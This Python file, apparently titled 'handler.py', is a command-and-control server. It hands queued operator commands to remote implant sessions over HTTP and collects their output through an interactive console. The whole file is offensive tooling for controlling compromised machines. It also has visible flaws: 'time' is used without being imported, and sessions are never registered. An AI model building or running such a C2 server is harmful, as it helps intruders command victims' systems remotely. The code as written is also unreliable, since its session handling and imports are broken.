# handler.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading

HOST = '0.0.0.0'
PORT = 8000

session_cmds = {}
session_results = {}

class C2Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        session_id = self.headers.get("X-Session-ID", "unknown")
        if self.path == "/stage":
            cmd = session_cmds.get(session_id, "")
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(cmd.encode())

    def do_POST(self):
        session_id = self.headers.get("X-Session-ID", "unknown")
        if self.path == "/result":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            session_results[session_id] = post_data
            self.send_response(200)
            self.end_headers()

def console():
    while True:
        if session_cmds:
            print("\n[+] Active sessions:")
            for sid in session_cmds:
                print(f"  {sid}")
        sid = input("\nSelect session ID (or type 'refresh'): ").strip()
        if sid == "refresh":
            continue
        if sid not in session_cmds:
            print("[!] Session not found.")
            continue
        while True:
            cmd = input(f"{sid}> ").strip()
            if cmd == "back":
                break
            session_cmds[sid] = cmd
            time.sleep(2)
            result = session_results.get(sid, "[*] No response.")
            print(result)

if __name__ == "__main__":
    server = HTTPServer((HOST, PORT), C2Handler)
    print(f"[*] Listening on port {PORT}...")
    threading.Thread(target=server.serve_forever, daemon=True).start()
    console()
